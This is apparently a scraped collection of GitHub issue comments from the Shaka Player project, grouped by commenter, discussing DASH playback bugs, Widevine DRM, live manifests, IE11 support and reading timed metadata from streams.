cue.align=middle and cue.position=2 I believe you would get the same effect as some TTML would produce. Again, not necessarily that part is a bug in Chrome and maybe how it is intended.\n. This was actually an intentional change as setting the cue.position to auto when textAlign is center is not because of a bug in Chrome but rather due to the differences between TTML and VTT. It should not impose any logical change from previous commit but make it more clear that it is not related to the Chrome bug so it will risk to be removed when that cue.align bug is fixed.\n. It basically is used to specify the vttregion holding positioning info and is later used when positioning the actual text in browser that does not provide native VTTRegion support. Once all browsers support this the polyfill and the \"special\" positioning code is not needed. ",
    "DanielEliraz": "Can we use the hls feature already?\nI cloned the master branch and built it, but I had error 4011 when i injected my stream.. ",
    "sergiofagostinho": "Hi,\nI've recently started using Shaka Player and I'm struggling with the same issue as @Doolali.\n@joeyparrish: I've just pulled and built the latest commit from master and I get the same error.\nThanks,\n. Hi,\nI've just pulled the latest commit from master and I get the following:\n- \"Car\" (YT DASH test) - MP4: OK\n- \"Car/CENC\" (YT DASH EME test): \"NotSupportedError\"\n- \"Oops\" (modified YT DASH EME test) - MP4, multi-DRM: (after playing for 8 seconds): \"Unknown playback error.\"\n- \"Sintel\" (1080p high bitrate test): \"InvalidStateError\"\nWhich content have you tried @Doolali ?\n. @joeyparrish: ok, got it. I used Big Buck Bunny from Edge's Test Page and it worked both in Edge and Chrome. In other words, I've set the following:\n- Custom manifest URL: https://samplestreamseu.streaming.mediaservices.windows.net/65b76566-1381-4540-87ab-7926568901d8/bbb_sunflower_1080p_30fps_normal.ism/manifest(format=mpd-time-csf)\n- Custom WV license server URL: http://axpr-wv-fe.cloudapp.net:8080/LicensingService\nThanks.\n. ",
    "javess": "Running the values of the audio and video buffer independently yield similar results\n```\n\napp.player_.videoSource_.streamsByType_.video.sbm_.sourceBuffer_.buffered.start(0);\n< 109.4\napp.player_.videoSource_.streamsByType_.audio.sbm_.sourceBuffer_.buffered.start(0);\n< 109.412426\napp.player_.videoSource_.streamsByType_.video.sbm_.sourceBuffer_.buffered.end(0);\n< 226.8\napp.player_.videoSource_.streamsByType_.audio.sbm_.sourceBuffer_.buffered.end(0);\n< 540\n```\n\nI'll send you the link to the stream privately so you can check it out. \n. joey this was handed to me by a coworker but I believe it was done using bitmovin. \nHow did you examine the segments? I've been looking for a way to manually do that for a while\n. ",
    "erankor": "Ah, forgot to write, I'm testing it here:\nhttp://shaka-player-demo.appspot.com/\nNot sure if that's the latest version or not\nThanks\nEran\n. Ok, thanks !\n. @joeyparrish, thank you for your reply !\nI am from Kaltura... :)\nCan you please explain what are the gaps you are seeing ?\nBecause I tested it now, and I don't see any gaps - \n- the duration of the first period in the MPD is 83.049\n- the earliest presentation time of the first fragment (in the sidx box) is 0\n- the earliest presentation time of the last fragment of the first period (fragment-9-v1-x2.m4s) is 0x006df927\n- the sum of frame durations in this fragment is: 0xbbb * 0x58 + 0xb7b = 0x413C3\ntherefore - (last PTS of first period) - (first PTS of first period) = 0x6df927 + 0x413C3 = 0x720CEA = 7474410.\nthe timescale in the sidx box is 90000, so we get 7474410 / 90000 = 83.049, which is exactly what is stated in the MPD.\nI also checked the PTS delay in the trun atom of the first and last frames of the period, and both have 0x1776, so that shouldn't be a problem either.\nI didn't check the other periods, because, as I previously wrote, no fragment of the second period is being pulled from the server.\nThanks again,\nEran\n. @joeyparrish, thank you for your reply !\nI am from Kaltura... :)\nCan you please explain what are the gaps you are seeing ?\nBecause I tested it now, and I don't see any gaps - \n- the duration of the first period in the MPD is 83.049\n- the earliest presentation time of the first fragment (in the sidx box) is 0\n- the earliest presentation time of the last fragment of the first period (fragment-9-v1-x2.m4s) is 0x006df927\n- the sum of frame durations in this fragment is: 0xbbb * 0x58 + 0xb7b = 0x413C3\ntherefore - (last PTS of first period) - (first PTS of first period) = 0x6df927 + 0x413C3 = 0x720CEA = 7474410.\nthe timescale in the sidx box is 90000, so we get 7474410 / 90000 = 83.049, which is exactly what is stated in the MPD.\nI also checked the PTS delay in the trun atom of the first and last frames of the period, and both have 0x1776, so that shouldn't be a problem either.\nI didn't check the other periods, because, as I previously wrote, no fragment of the second period is being pulled from the server.\nThanks again,\nEran\n. No problem, glad this was resolved. \nThanks everyone !\n. No problem, glad this was resolved. \nThanks everyone !\n. @joeyparrish, to add to what @itaykinnrot wrote - when playing a stream with multiple audio tracks, currently the only way to identify the different tracks is using the lang attribute of AdaptationSet. We have customers who would like to customize the label that is displayed to the end user for selecting the audio track. Also, multiple audio tracks are sometimes used for uses cases which are not multiple languages, for example - one audio track with background music and one without it. \nWhile it is possible to pass this info out-of-band, we feel it makes most sense to pass it in-band in the MPD. Other protocols have support for this - in HLS you can set the NAME attribute of EXT-X-MEDIA, and in MSS there's a Name attribute on StreamIndex.. ",
    "ct1n": "I've tried to take a look at the preview branch but there isn't any test player (index.html is gone). I've also tried using the one from the master branch but there seem to be too many changes.\nIs there any player I could use?\n. Thanks!\nWe have a test stream here: http://31.14.160.192:8000/ah/manifest.mpd\nIt doesn't seem to work though...\n. Make sure you use the URL from the Location element for future updates. The first request without URL query creates a new session and to access it in the future it needs the listeningSessionId URL parameter.\n. Segments from the start of the first Period also are removed (in this case the timestamp of the first segment minus the presentationTimeOffset will be greater than zero). This is handled properly in GPAC MP4Client and dash.js when using a single Period (they have problems with multi-period).\n. Thank you!\n. Thanks!\n. Since commenting on #285 I've realized that what I said about there being a difference between PTO and the first segment timestamp is quite probably wrong: DASH-IF Interoperability Points (http://dashif.org/w/2015/04/DASH-IF-IOP-v3.0.pdf) states, in section 4.4.3.3:\n\nIn order to make the MPD joining friendly and to remove data that is available in the past,\nany segments that have fallen out of the time shift buffer may no longer be announced in\nthe MPD. In this case, the Period start may be moved by changing one or both,\nMPD@availabilityStartTime and Period@start. However, this requires that the\n@startNumber, @presentationTimeOffset and S values need to be updated such\nthat the Segment Information according to section 4.3.2.2.6 is not modified over an MPD\nupdate.\n\nThis means we should probably update our server to have the Period start and PTO to match the new first segment (e.g., instead of Period start PT0S, PTO 5000, first segment ts 10000 we should have Period start PT5S, PTO 10000, first segment ts 10000).\nHowever, I'm not sure this has any effect on shaka (note that the effective timestamp, availabilityStartTime + periodStart + ts - PTO, is the same).\n. Thanks for looking into this!\nOur server is called \"AIS Streamer\" and is used for server-side ad insertion by a lot of broadcasters.\nWe've tried the player with these 3 commits but it seems it's not working anymore. Before it was playing about one minute (including proper period switching) and stopping. Not it's not playing at all.\n. In the end we've decided not to implement the recommendation from DASH-IF Interoperability Points according to which we should update period start and PTO when segments are removed from the beginning. It doesn't sound like it's mandatory and it causes problems in both Shaka (we previously thought it didn't but there are apparently issues), and other players. It also seems more logical to keep them at their initial value as this provides more information.\nWe've updated the server at http://31.14.160.192:8000/ah/manifest.mpd with a new version. The only real difference is that the availabilityStartTime has been fixed between updates (it used to drift by one or two seconds). Further updates to the way our manifests look will be minor, if any.\nWe're happy to say that with https://github.com/google/shaka-player/pull/315 we have uninterrupted, smooth playback, for many hours (as long as we have tested).\nThanks very much for your help!\n. ",
    "jernoble": "It looks like the problem for Safari is rounding from a floating point value (0.083333) to a rational time value (2/24). Represented as a double, the seek time ends up as 0.083333333333333329, which is ever so slightly less than 2/24 (or, 0.08333333333333333).\nSo Safari thinks that the media has seeked into an unbuffered range, and fails to re-enqueue upcoming samples correctly.\n. @joeyparrish Actually, it's either a bug in Safari, Chrome, & Firefox, or it's a bug in Edge, depending on the outcome of https://github.com/w3c/media-source/issues/54.\nEdge is using the decode timestamp to fill their .buffered ranges, and the other browsers are using the presentation timestamp.\nYou can file a bug against Safari at http://bugreport.apple.com, or against WebKit at http://bugs.webkit.org/. But I would argue that in light of the likely result of the media-source issue above, Safari and WebKit are unlikely to change their behavior here.\nEDIT: Oh, I see you're talking about the behavior of jumping small starting gaps. Please do file a bug (preferably on http://bugs.webkit.org, so you can more easily see the status), and CC me on it.\n. ",
    "imalex": "On a fresh install of Chrome desktop browser, the Widevine CDM download will kick off 6 mins later.  This shouldn't be a problem for existing Chrome installs, only for a new Chrome installation.\n. See\nhttps://developers.google.com/web/updates/2017/12/chrome-63-64-media-updates#persistent-licenses-windows-mac\nOn Sun, Dec 17, 2017 at 7:31 PM, sridhar notifications@github.com wrote:\n\nHi,\nCan you please let me know in which version of Windows Chrome persistent\nlicenses are supported in beta\nOn 17-Dec-2017 12:01 AM, \"Joey Parrish\" notifications@github.com wrote:\n\nChrome 64, with persistent license support on Mac & Windows, is in beta.\nShaka-based applications will not need to be updated to take advantage\nof this feature in Chrome.\nI'm going to go ahead and close this bug, but please feel free to reply\nwith any questions you might have about this.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/512#\nissuecomment-352201751,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AC5MuArxoRgJGvkklP-\nPeXNEvd58PIwdks5tBAyPgaJpZM4J5qoR\n.\n\n\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/512#issuecomment-352317273,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AKOFfUYyOcJUnvNKR_osOtCbmNZpys86ks5tBdyEgaJpZM4J5qoR\n.\n. Chrome 58 or earlier is no longer supported by Widevine.. \n",
    "neilRGS": "@peyoh. Hi.  I am using 1.6.3\n. @peyoh. Will do.  I'll post the result of doing that, here.\n. @peyoh.  I have downloaded, built and tried 1.6.2\nUnfortunately, no difference in behaviour has been observed.\nI will look at it again later today/tomorrow, as I need to jump on to a new task now\nThanks.\n. Hi @peyoh.\nI have cleared my browser cache and tried again this morning with v1.6.2\nI get a very similar result, in that a blank player loads and then nothing further happens visually.\nThe manifest loads and then is reloaded every 10s or so.\nI had a look at https://html5test.com/ and it shows that IE11 does not support Promise.  As there are plenty of Promises in the Shaka code, perhaps that is a major issue.\nIf so, I wonder why the Shaka docs suggest that IE11 is ok?\nUltimately, as IE11 is a browser in use by a good many of our clients, I am going to have to find something else which will work without flash being installed.\nDo you know of any other libraries that I could try?\nMany thanks again for your help and input, it is appreciated.\nNeil.\n. Hi @peyoh.\nA final note.\nI have tried using a polyfill and this now shows in the support page that Required Features is 'OK'.\nNo change in live streaming though.\nI used this: https://github.com/taylorhakes/promise-polyfill\nI can rule out encoding issues, because I get successful playback in Firefox, Chrome & Edge with both live and VOD.  In IE11 only VOD plays successfully.\nSo, no further on really, but I wanted to add that extra info, for anyone else reading this, experiencing the same problem.\nMany thanks\nNeil.\n. Hi @joeyparrish \nThank you for the update.  That's good to hear!\nI will await the release of v2 beta with great anticipation.\nIf it helps any, I have had a certain amount of success with Dash.js and IE11.  It is not production quality though, as it will stream for a while and then seems to get stuck in a loop and then continues etc...\nI would obviously prefer to use a single framework if at all possible, and don't want to spend time coercing Dash to work as Shaka is going to be moving in this direction very soon.\nHave a good weekend,\nNeil.\n. Hi Joey.\nI hope everything is going well.\nAny update on the release of v2 at all?\nThanks in advance,\nNeil.\n. Will do, Joey\nIt won't be until Monday, as it is beer o'clock, here in the UK.\n. Hi Joey.\nSorry for the delay.\nI have just spun up a demo to play with v2.\nI have followed the instructions at http://shaka-player-demo.appspot.com/docs/api/tutorial-basic-usage.html but am unfortunately stumped by this error:\nmyapp.js:7          Uncaught ReferenceError: shaka is not defined\nHas the shaka object been renamed to something else in an update, perhaps?\nMany thanks and best regards,\nNeil\n. UPDATE: Working. \u263a  About to do more testing.\nI cleared everything out, rebuilt all.py and tried again.\nBest regards,\nNeil.\n. Hi Joey.\nIn IE11, the console shows everything as working ok.  I am getting video and audio chunks streaming through the player on-screen.  It is just showing the poster image with a loading animation.\nThe manifest is generated by our Wowza server and is this:\n+++++++++++++++++++++++++++++++++++++++++++++++\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<MPD xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n     xmlns=\"urn:mpeg:dash:schema:mpd:2011\"\n     xmlns:xlink=\"http://www.w3.org/1999/xlink\"\n     xsi:schemaLocation=\"urn:mpeg:DASH:schema:MPD:2011 http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd\"\n     profiles=\"urn:mpeg:dash:profile:isoff-live:2011\"\n     type=\"dynamic\"\n     minimumUpdatePeriod=\"PT5.013S\" \n     publishTime=\"2016-04-20T09:18:26Z\" \n     availabilityStartTime=\"2016-04-19T13:31:09Z\" \n     timeShiftBufferDepth=\"PT50.0S\"\n     suggestedPresentationDelay=\"PT15.0S\" \n     minBufferTime=\"PT6.0S\">\n<ProgramInformation>\n    <Title>Stream1</Title>\n</ProgramInformation>\n<Location>http://wowza.rgsit.com/LiveSim/_definst_/Stream1/manifest_w2047453045.mpd</Location>\n<Period id=\"0\" start=\"PT0.0S\">\n    <AdaptationSet id=\"0\" mimeType=\"video/mp4\" width=\"512\" height=\"288\" par=\"16:9\" frameRate=\"30\" segmentAlignment=\"true\" startWithSAP=\"1\" subsegmentAlignment=\"true\" subsegmentStartsWithSAP=\"1\">\n        <SegmentTemplate timescale=\"90000\" media=\"chunk_ctvideo_cfm4s_rid$RepresentationID$_cs$Time$_w2047453045_mpd.m4s\" initialization=\"chunk_ctvideo_cfm4s_rid$RepresentationID$_cinit_w2047453045_mpd.m4s\">\n            <SegmentTimeline>\n                <S t=\"6406308000\" d=\"900000\"/>\n                <S d=\"900000\"/>\n                <S d=\"900000\"/>\n                <S d=\"900000\"/>\n                <S d=\"900000\"/>\n            </SegmentTimeline>\n        </SegmentTemplate>\n        <Representation id=\"p0a0r0\" codecs=\"avc1.42c015\" sar=\"1:1\" bandwidth=\"601000\" />\n    </AdaptationSet>\n    <AdaptationSet id=\"1\" mimeType=\"audio/mp4\" lang=\"eng\" segmentAlignment=\"true\" startWithSAP=\"1\" subsegmentAlignment=\"true\" subsegmentStartsWithSAP=\"1\">\n        <Role schemeIdUri=\"urn:mpeg:dash:role:2011\" value=\"main\"/>\n        <SegmentTemplate timescale=\"48000\" media=\"chunk_ctaudio_cfm4s_rid$RepresentationID$_cs$Time$_w2047453045_mpd.m4s\" initialization=\"chunk_ctaudio_cfm4s_rid$RepresentationID$_cinit_w2047453045_mpd.m4s\">\n            <SegmentTimeline>\n                <S t=\"3416697856\" d=\"480256\"/>\n                <S d=\"480256\"/>\n                <S d=\"480256\"/>\n                <S d=\"479232\"/>\n                <S d=\"480256\"/>\n            </SegmentTimeline>\n        </SegmentTemplate>\n        <Representation id=\"p0a1r0\" codecs=\"mp4a.40.2\" audioSamplingRate=\"48000\" bandwidth=\"96000\">\n            <AudioChannelConfiguration schemeIdUri=\"urn:mpeg:dash:23003:3:audio_channel_configuration:2011\" value=\"2\"/>\n        </Representation>\n    </AdaptationSet>\n</Period>\n</MPD>\n+++++++++++++++++++++++++++++++++++++++++++++++\n. I'll take a look and see if I am able to do that.\n. Hi. Thanks for picking this up.\nWhen the error occures, I get this as the log tail when looking at chrome://media-internals\n00:00:13 453    event   PLAY\n00:09:40 374    error   Unexpected combination of buffers with the same timestamp detected at 79325\n00:09:40 375    error   media::MediaSourceState::Append: stream parsing failed. Data size=131072 append_window_start=0 append_window_end=1.#INF\n00:09:40 375    pipeline_error  pipeline: decode error\n00:09:40 375    pipeline_state  kStopping\n00:09:40 390    pipeline_state  kStopped\nThe first line of the above is left from when it was playing ok.\nThanks for pointing out the media-internals feature, I didn't know that existed :-)\nN.\n. Hi.\nI'm currently testing again on Chrome Canary and Chrome v50, which updated itself this morning.\nI'll send you the link in a PM.\nMany thanks\nNeil.\n. I may be being completely dim, here, but I can't see how to send a PM.\n?\n. It would the the actual timestamps in the media segments.  The idea being to mitigate buffering and latency, so that when the player receives the timestamp as a piece of meta data perhaps, then we can display the relevant slide for that time.\nShall I transfer this to #259 ?\nThanks\nN.\n. It would the the actual timestamps in the media segments.  The idea being to mitigate buffering and latency, so that when the player receives the timestamp as a piece of meta data perhaps, then we can display the relevant slide for that time.\nShall I transfer this to #259 ?\nThanks\nN.\n. Testing this morning in an updated Chrome v50 and Canary, shows that the chrome media-internals is able to see a time-stamp of some description.\nOccasionally, the diagnostics shows something like this:\n00:05:37 701   debug   Detected an append sequence with keyframe following a non-keyframe, both with the same decode time-stamp of 1269.2\nI have tested starting and stopping the stream, to observe that number.  It correlates with the amount of time that the stream (Wowza application) has been running. So that is good.  I am not yet sure how to get to this information.  Ideas gratefully received and I will post anything I find as well.\nUltimately, if we can get a time-stamp of some description from the stream, then I'll be happy.  I'm currently looking at Chrome's media_internals.js file to see if I can find where it is reading the timestamp.\n. Hi Joey.\nNot quite.\nThat will just show me the time that the player has been playing for.\nWhat I need is the time that the stream has been running for. \nIn tests using JW Player, they have a method (on.('meta')) through which i can get a certain amount of metadata from the stream. I have found that metadata.segment.mediaSequenceNumber will give me the number of the chunk that is loaded.  I can set the chunk duration on the Wowza application config, to be, say 2 seconds and then multiply the mediasequencenumber value.  That will give me a close approximation of the time the stream has been running for.  I believe that it will be close enough for our immediate needs, but am running tests just now to see if there  is any drift, and if so, by how much over a period of time.\nHowever, moving forward using Shaka, I need to be able to access data in a similar way.  Even better, the encoder we use (Streamcoders Mediasuite) will allow us to send out additional tracks, and we will be able to send a track alongside the video and audio, which can contain timing data.\nIs there any way track data such as that can be read through Shaka?  The stream gets sent from the encoder to Wowza, and then played through the player.  I have established that injecting metadata at the Wowza end is problematic, and I want to avoid that.  It really needs to be done in the encoding application and read by the player.  Only then will we know everything is synchronised well enough for our player platform to be able to do what it needs at the time it needs to do it.\nCheers,\nNeil.\n. Hi Joey.\nNot quite.\nThat will just show me the time that the player has been playing for.\nWhat I need is the time that the stream has been running for. \nIn tests using JW Player, they have a method (on.('meta')) through which i can get a certain amount of metadata from the stream. I have found that metadata.segment.mediaSequenceNumber will give me the number of the chunk that is loaded.  I can set the chunk duration on the Wowza application config, to be, say 2 seconds and then multiply the mediasequencenumber value.  That will give me a close approximation of the time the stream has been running for.  I believe that it will be close enough for our immediate needs, but am running tests just now to see if there  is any drift, and if so, by how much over a period of time.\nHowever, moving forward using Shaka, I need to be able to access data in a similar way.  Even better, the encoder we use (Streamcoders Mediasuite) will allow us to send out additional tracks, and we will be able to send a track alongside the video and audio, which can contain timing data.\nIs there any way track data such as that can be read through Shaka?  The stream gets sent from the encoder to Wowza, and then played through the player.  I have established that injecting metadata at the Wowza end is problematic, and I want to avoid that.  It really needs to be done in the encoding application and read by the player.  Only then will we know everything is synchronised well enough for our player platform to be able to do what it needs at the time it needs to do it.\nCheers,\nNeil.\n. Hi Joey.\nI have been dragged off this (kicking and screaming!) and on to a pressing issue on a different project.  However, in the meantime, I'll give you a summary of what I am trying to achieve and will welcome your thoughts:\nWe have a presentation platform ('stage') through which the user will watch a live stream and next to the player, slides will appear at certain times as the stream plays.\nWe need to be able to sync the slides to the stream, so due to buffering and latency, we can't use a separate web service to push the slide markers to the 'stage'.\nTherefore, we need to get time data of some sort from the stream itself.\nBearing in mind that the stream might start well before the presenter starts presenting, so the presenter will basically push a button when they start speaking.  That will be our 'zero' point.\nIdeally then, we need a way of looking into the stream to get the event data (timestamp, or a piece of text etc.) so that our stage can read that event and pull in the correct slide, or fire off whatever event of its own, as required.\nI hope that clarifies it a bit better for you.\nThanks in advance,\nNeil.\n. Hi Joey.\nI have been dragged off this (kicking and screaming!) and on to a pressing issue on a different project.  However, in the meantime, I'll give you a summary of what I am trying to achieve and will welcome your thoughts:\nWe have a presentation platform ('stage') through which the user will watch a live stream and next to the player, slides will appear at certain times as the stream plays.\nWe need to be able to sync the slides to the stream, so due to buffering and latency, we can't use a separate web service to push the slide markers to the 'stage'.\nTherefore, we need to get time data of some sort from the stream itself.\nBearing in mind that the stream might start well before the presenter starts presenting, so the presenter will basically push a button when they start speaking.  That will be our 'zero' point.\nIdeally then, we need a way of looking into the stream to get the event data (timestamp, or a piece of text etc.) so that our stage can read that event and pull in the correct slide, or fire off whatever event of its own, as required.\nI hope that clarifies it a bit better for you.\nThanks in advance,\nNeil.\n. Hi Joey.\nYes, that pretty much sums it up. :-)\n. Hi Joey.\nYes, that pretty much sums it up. :-)\n. Tested as at Feb 7th 2017.  IOS still can't use Shaka (Tried Safari and Chrome on iPad).\nShame on you, Apple!. Hi and thanks for your response.\nI will attempt to clarify.\nAs flash is dying a death, we have the need to replicate our current methodology into a non-flash player.\nWe currently send cue-points in an rtmp stream.  This stream is sent to Wowza, and the client connects to the Wowza Application.  In order to get the cue-points from the stream, we have a home-built java module which parses the rtmp stream and sends the cue-points as events, so that our JavaScript library can read them and signal a web service to show a slide at that point. So, the viewer sees the video and its relevant slide (png). Another cue-point comes in, js reads it and calls the web service to show the next slide, and so on.\nThe DASH manifest is generated on the fly by Wowza and we have no interaction with it.\nThe cue-points are sent out by the human presenter, during their live broadcast, so they are not completely pre-determined. We use Nanocosmos as the encoder, which sends the cue-points with the rtmp stream.\nAt the client-end, JW player's on(meta, ...) function reads the cue-point, which typically looks like this:\n{\"TIT2\":\"{\\\"Tag\\\":\\\"Slide002_16082016091701.png\\\",\\\"time\\\":\\\"19.1330944\\\",\\\"type\\\":\\\"UpdateMarker\\\"}\",\"title\":\"{\\\"Tag\\\":\\\"Slide002_16082016091701.png\\\",\\\"time\\\":\\\"19.1330944\\\",\\\"type\\\":\\\"UpdateMarker\\\"}\",\"width\":1280}'\nAfter that, our own js library takes over, splits that up and sends the necessary pieces to the web service.\nSo, it it that json string that we wish to extract from the stream when we use Shaka player, rather than JW player.\nDoes that make it a bit clearer, or have I succeeded only in muddying the water further? :-)\nMany thanks,\nNeil.\n. Hi again. I have attached a top-level overview of the process, in case it helps.\nMany thanks,\nNeil.\n\n. Hi Joey. Thanks for your reply.\nOk, so bearing in mind that I am currently doing this with JW player, there is a method in the JW library, on('meta') which is essentially an event listener:\nhttps://developer.jwplayer.com/jw-player/docs/developer-guide/api/javascript_api_reference/#metadata\nI use that to get the data attached to the onCuePoint event which comes in from Wowza (the java module) with the rtmp stream.  I can then pick up that data in our own JS library and process it as required.  That usually involves sending a timestamp found in the data to a web service which then updates the stage with a new slide image. We will also use it to show a quiz, or a chat window and record some stats.\nI can give you the source of the java module to look at, if interested? It isn't opensource though (although I believe parts of it are), so confidentialty applies etc.\nWe will need to continue using JW for IOS and any other platform/browser which doesn't yet support MSE. We have a client who runs a Citrix Xendesk environment, with Flash redirection in place, and JW is not working for them. We also believe that the Flash redirection will split the event data from the stage anyway, which would mean we can't read it at all; meaning that a non-JW solution is hugely desirable for those users.\nI hope that makes our use-case a bit clearer?  I am happy to give you access to our system, if you want to investigate further.\nMany thanks and best regards,\nNeil.\n. I will try and get a manifest from Wowza. It generates them on the fly, so it isn't as easy as grabbing a file.. ",
    "johan": "Certainly.\n. Sure; sounds worthwhile.\n. Ah, on a closer read \u2013 don't hold your breath; my python is rusty, and I don't use the v2 branch myself for anything yet, so I probably won't take time to do that until I end up actually using/needing it there myself.\n. Seems it builds happily at my end (and the exact same output, save the git hash) both before and after the change, so that sounds likely. This change may not even be necessary for the python version, if its filesystem traversing api:s already are defined to return files in sorted order.\n. ",
    "jasonwitty": "it is encrypted\n. around 21 seconds\n. also after stall if i switch to a different rendition (at a different resolution) playback will start, once i switch back to the 640x368 it will stall again.\n. unified streaming.\n[EDIT: long XML removed]\n. encoder is main concept\n. the same stream will work in a silverlight player or on an xbox wrapped in a smooth streaming manifest.\n. I apologize, I do not understand what is being requested.\n. I tested it on a bunch of different android devices we have around the office and it does not seem to load at all. I dont have access to a device with Chrome OS.\n. thank you\n. ",
    "basharam": "Thanks for the Firefox 45 info. Events are firing as expected :)\n. ",
    "amirch1": "I can see your Widevine examples manage to play on Chromecast after a large amount of waiting time (about half a minute). Our stream never starts to play. Any chance of getting the logs from your Chromecast receiver?\n. Seems to be an issue with the latest Chromecast firmware upgrade: https://code.google.com/p/google-cast-sdk/issues/detail?id=785\n. Agreed. Thanks!\n. ",
    "cmgrecu": "@joeyparrish \nSo far I implemented it also on SegmentList, I still have to do it on SegmentBase.\nCan you please take a look at what I did so far? In my daily life I am a C++ dev, so I might do silly mistakes since I am not too familiar with these tools...\nI adjusted the tests to cover also my changes, I added two new test and I updated the old ones (an extra parameter was needed in mpd_utils_unit createTimeline).\nAnd a short extra (maybe stupid) question:\nOne of my tests fails \nExpected ({ position: 1, startTime: 120, endTime: 130, uris: [ 'http://example.com/s-120.m4a' ], startByte: 0, endByte: null }) \nto equal ({ position: 1, startTime: 120, endTime: 130, uris: [ 'http://example.com/s-120.mp4' ], startByte: 0, endByte: null }).\nThey are equal from my point of view... Am I missing something?\nThanks,\nCostel\n. @joeyparrish \nYes, you are right, specs says that \"to determine the presentation time in the Period,\nthe value of the attribute @presentationTimeOffset needs to be deducted\".\n. @joeyparrish \nI implemented it also in SegmentBase, can you take a look please? I had two options, either to do a post-process step and adjust the resulted times considering PTO, or to pass it further... I chose the second option. \nI still trying to figure out how to test it. \nI also signed the CLA.\nThanks!\n. @joeyparrish @tdrews \nThanks for feedback.\nDone! I hope I didn't miss anything.\n. Done.\nThank you.\nSorry for so much typos in 5 lines of code :)\n. @joeyparrish \nYou are right... I missed that, I saw them identical... :) I think I was tired. Thanks.\n. ",
    "faiyeah": "Sorry for my delayed response. \nHere I have attached two files, one is the shaka player log with hbbtv + widevine encryption content; while the other is the shaka player log with hbbtv and clear content:\nshaka-player-demo.appspot.com_hbbtv+widevine.txt\nshaka-player-demo.appspot.com_hbbtv+clean.txt\nPlease review, and re-open the issue. \nSorry again for the inconvenience.\nRyan Chan \n. I am using the following widevine server:\nhttp://license.uat.widevine.com/cenc/getcontentkey/widevine_test\nRyan Chan\n. Hi tdrews,\nI apologize for the confusing and incomplete description of the issue. I would like to clarify the issue I observed. \nI think a more concrete issue that I would like to tackle is - \"Encrypted content with HbbTV profile does not switch video qualities properly in Shaka Player v 1.6.5\".\nTo reproduce the issue, I am providing 4 sample contents:\n- https://www.dropbox.com/s/9583c8pta4aow7r/iso_clear.tar.gz?dl=0\n  - Content A: Clear DASH content with ISO profile\n- https://www.dropbox.com/s/845bvoqb4er3y11/iso_enc.tar.gz?dl=0\n  - Content B: Encrypted DASH content with ISO profile\n- https://www.dropbox.com/s/w02mjfqf4lc64vs/hbbtv_clear.tar.gz?dl=0\n  - Content C: Clear DASH content with HbbTV profile\n- https://www.dropbox.com/s/nno41093fs2wdq0/hbbtv_enc.tar.gz?dl=0\n  - Content D: Encrypted DASH content with HbbTV profile\nThe Shaka Player which can reproduce the issue:\n- http://v1-6-5.shaka-player-demo.appspot.com/\nSteps to reproduce the issue:\n- Host the contents above\n  - Each content contains 3 different video qualities\n  - 480 x 270 (500K)\n  - 640 x 360 (1M)\n  - 1280 x 720 (1.5M)\n- Load the player\n- Put the mpd URL in \"Stream Setup > Custom manifest URL:\"\n- Leave the field \"Stream Setup > Custom WV license server URL: [?]\" empty\n- Disable the adaptation by unchecking \"Stream Info > Enable adaptation?\"\n  - By observation, it loaded the lowest bitrate (480 x 270) by default with the above contents\n- Click \"Load Stream\"\n- Do switching across different qualities in \"Stream Info > Available video tracks:\"\n  - Only trigger switch when \"Stream Info > Buffered behind:\" is larger than \"Stream Info > Buffered ahead:\"\n  - If switching is successful, we should be able to observe resolution changed in \"Stream Info > Active resolution:\", and the playback should continue, although sometimes with glitch (#350).\nIssues observed:\n- Switching failed for Content D. At the time of switching failure, the playback get stuck.\nHere are the screenshots:\n- Before switching, the playback is normal:\n  \n- After switching, the playback get stuck:\n  \nHere is the console debug log:\nv1-6-5.shaka-player-demo.appspot.com-1461313174612.txt\nAddition comments:\n- The switching issue does not occur for Content A, B, and C. So, I would personally guess this will only happen with combination of encryption and HbbTV content.\nFor more clarification, please definitely let me know.\nRyan Chan\n. I have re-titled the issue so that it is reflecting exactly what is reported.\nRyan Chan\n. You are very welcomed. This is output captured from Harmonic packager, in which they are the one of the very few to support HbbTV output profile.\nMany thanks.\nBest regards,\nRyan Chan\n- sent from my iPhone\n\nOn 23 Apr 2016, at 04:19, tdrews notifications@github.com wrote:\nThank you for the detailed report. I can reproduce the issue. Which packager are you using to create the content?\n\u2015\nYou are receiving this because you were mentioned.\nReply to this email directly or view it on GitHub\n. What is the expected tolerance if t is not exactly equal to 0, with the current implementation?\n\nFrom my past experience, we cannot always expect the VOD contents are with leading video (means video presentation is earlier than other streams like audio). We have a lot of customer contents in which contents with leading audios dominate in their repository. I would appreciate if you can remove this limitation as if what is behaved like v1.6.5, this would eliminate many interop issues. \nAlso, I am also interested in the root cause of #339, in which I think the same player error applied for live streams.\nThanks for the response. \nRyan Chan \n. What is the expected tolerance if t is not exactly equal to 0, with the current implementation?\nFrom my past experience, we cannot always expect the VOD contents are with leading video (means video presentation is earlier than other streams like audio). We have a lot of customer contents in which contents with leading audios dominate in their repository. I would appreciate if you can remove this limitation as if what is behaved like v1.6.5, this would eliminate many interop issues. \nAlso, I am also interested in the root cause of #339, in which I think the same player error applied for live streams.\nThanks for the response. \nRyan Chan \n. Thanks for your response. So, can I say this is a design limitation in v1, but has been fixed in v2?\nMany thanks.\nBest regards,\nRyan Chan\n- sent from my iPhone\n\nOn 23 Apr 2016, at 06:21, tdrews notifications@github.com wrote:\nYes, this is WAI: when you explicitly select a video track, the transition will not be seamless.\n\u2015\nYou are receiving this because you authored the thread.\nReply to this email directly or view it on GitHub\n. Thanks for your response. So, can I say this is a design limitation in v1, but has been fixed in v2?\n\nMany thanks.\nBest regards,\nRyan Chan\n- sent from my iPhone\n\nOn 23 Apr 2016, at 06:21, tdrews notifications@github.com wrote:\nYes, this is WAI: when you explicitly select a video track, the transition will not be seamless.\n\u2015\nYou are receiving this because you authored the thread.\nReply to this email directly or view it on GitHub\n. So, does that mean v1 demo app suffer this, because by default it clears it buffer; while v2 demo app does not suffer this, as by default it keeps the buffer?\n\nMany thanks.\nBest 